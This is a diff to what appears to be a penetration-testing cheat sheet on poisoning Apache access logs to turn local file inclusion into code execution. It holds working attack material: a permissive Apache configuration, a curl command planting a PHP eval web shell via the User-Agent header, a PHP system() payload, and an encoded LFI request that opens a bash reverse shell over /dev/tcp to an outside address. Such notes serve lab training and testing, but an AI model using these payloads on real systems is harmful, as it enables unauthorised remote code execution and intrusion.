@@ -5,6 +5,18 @@ allow_url_open open
 ```
 
 ### Contaminating Log Files to LFI
+Prerequsites
+```
+/etc/apache2/apache2.conf
+
+# -- Root Directory (System-wide restrictions) --
+<Directory />
+    Options Indexes FollowSymLinks Includes ExecCGI
+    AllowOverride All
+    Require all granted
+</Directory>
+```
+exploit
 ```
 1.
 nc -nv 10.11.0.22 80
@@ -12,6 +24,7 @@ nc -nv 10.11.0.22 80
 http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
 
 2. User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
+curl -A "<?php eval(\$_GET['cmd']); ?>" http://172.16.1.10
 http://10.11.0.22/menu.php?file=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
 
 Windows log path:
